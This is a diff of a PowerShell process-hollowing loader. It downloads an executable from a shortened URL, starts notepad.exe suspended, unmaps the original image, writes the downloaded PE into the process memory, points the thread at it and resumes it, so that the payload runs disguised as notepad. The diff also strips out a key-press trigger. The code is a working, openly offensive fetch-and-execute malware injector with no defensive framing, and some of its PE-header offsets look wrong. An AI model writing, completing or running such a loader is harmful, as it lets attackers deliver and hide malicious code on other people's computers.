@@ -143,41 +143,12 @@ public class Native {
 }
 "@ -Language CSharp
 
-function Get-Payload {
-    param([string]$url)
-    return (Invoke-WebRequest $url -UseBasicParsing).Content
-}
-
-function Convert-HexToBytes {
-    param([string]$hex)
-    $bytes = New-Object byte[] ($hex.Length / 2)
-    for ($i = 0; $i -lt $bytes.Length; $i++) {
-        $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
-    }
-    return $bytes
-}
-
 # CONFIG
 $exeUrl = "https://tinyurl.com/mwr259jv"
 
 Write-Host "[*] Downloading 64-bit payload..."
 $payloadBytes = Invoke-WebRequest $exeUrl -UseBasicParsing
-$pe = $payloadBytes.Content
-$peBytes = [System.Text.Encoding]::ASCII.GetBytes($pe)
-
-Write-Host "[*] Waiting for F10 to inject..."
-while ($true) {
-    Start-Sleep -Milliseconds 100
-    # Replace IsKeyLocked with GetAsyncKeyState or other reliable method if needed
-    # Here a simple workaround:
-    $keyState = [console]::KeyAvailable
-    if ($keyState) {
-        $key = [console]::ReadKey($true)
-        if ($key.VirtualKeyCode -eq 121) {  # F10 keycode is 121 decimal
-            break
-        }
-    }
-}
+$peBytes = $payloadBytes.Content
 
 $si = New-Object Native+STARTUPINFO
 $pi = New-Object Native+PROCESS_INFORMATION
@@ -187,32 +158,31 @@ Write-Host "[*] Launching notepad suspended..."
 $result = [Native]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
 if (!$result) { Write-Error "[-] Failed to create process"; exit }
 
-# Get base address
+# Prepare context
 $ctx = New-Object Native+CONTEXT64
-$ctx.ContextFlags = 0x100000 -bor 0x1F
-  # <-- Fixed bitwise OR with -bor inside parentheses
+$ctx.ContextFlags = 0x100000 -bor 0x1F  # CONTEXT_ALL
+
 [Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
 
-# Read base image address
+# Read base image address from PEB
 $buffer = New-Object byte[] 8
 [IntPtr]$bytesRead = [IntPtr]::Zero
 [Native]::ReadProcessMemory($pi.hProcess, [IntPtr]($ctx.Rdx + 0x10), $buffer, 8, [ref]$bytesRead)
 $imageBase = [BitConverter]::ToUInt64($buffer, 0)
 
-# Unmap
+# Unmap existing image
 [Native]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]$imageBase) | Out-Null
 
-# Parse new image size and entry
+# Parse PE headers
 $newImageBase = $imageBase
-$payloadSize = $peBytes.Length
-$entryRVA = [BitConverter]::ToUInt32($peBytes, 0x28)  # e_lfanew + 0x28 (AddressOfEntryPoint)
-$headersSize = [BitConverter]::ToUInt32($peBytes, 0x54) # SizeOfHeaders
+$entryRVA = [BitConverter]::ToUInt32($peBytes, 0x28)
+$headersSize = [BitConverter]::ToUInt32($peBytes, 0x54)
 $sizeOfImage = [BitConverter]::ToUInt32($peBytes, 0x50)
 
-# Allocate memory
+# Allocate memory for the new image
 $remoteBase = [Native]::VirtualAllocEx($pi.hProcess, [IntPtr]$newImageBase, $sizeOfImage, 0x3000, 0x40)
 
-# Write headers
+# Write PE headers
 [Native]::WriteProcessMemory($pi.hProcess, [IntPtr]$remoteBase, $peBytes, $headersSize, [ref]$null) | Out-Null
 
 # Write each section
@@ -227,12 +197,12 @@ for ($i = 0; $i -lt $numberOfSections; $i++) {
     $sectionOffset += 0x28
 }
 
-# Set RIP to new entry point
+# Set thread context to new entry point
 $ctx.Rcx = [UInt64]($remoteBase.ToInt64() + $entryRVA)
 $ctx.Rip = [UInt64]($remoteBase.ToInt64() + $entryRVA)
 [Native]::SetThreadContext($pi.hThread, [ref]$ctx) | Out-Null
 
-# Resume
+# Resume the suspended thread
 [Native]::ResumeThread($pi.hThread) | Out-Null
 
 Write-Host "[+] Hollowing complete! notepad.exe is running your payload."
